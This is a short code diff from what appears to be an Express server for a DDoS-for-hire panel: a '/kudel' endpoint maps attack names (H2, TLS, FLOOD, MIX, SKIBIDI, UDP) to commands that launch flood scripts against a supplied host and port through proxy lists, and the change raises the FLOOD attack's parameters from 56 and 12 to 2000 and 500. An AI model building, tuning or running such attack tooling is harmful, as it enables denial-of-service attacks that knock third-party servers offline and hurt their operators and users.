@@ -32,7 +32,7 @@ app.get('/kudel', (req, res) => {
   const attackMethods = {
     'H2': `./lib/cache/h2.js ${host} ${time} 45 12 proxy.txt`,
     'TLS': `./lib/cache/tls.js ${host} ${time} 32 8 proxy.txt`,
-    'FLOOD': `./lib/cache/flood.js ${host} ${time} 56 12 proxy.txt`,
+    'FLOOD': `./lib/cache/flood.js ${host} ${time} 2000 500 proxy.txt`,
     'MIX': `./lib/cache/mix.js ${host} ${time} 12 45 proxy.txt -v 3`,
     'SKIBIDI': `./lib/cache/skibidi.js ${host} ${time}`,
     'UDP': `./lib/cache/udp.js ${host} ${port} ${time}`,
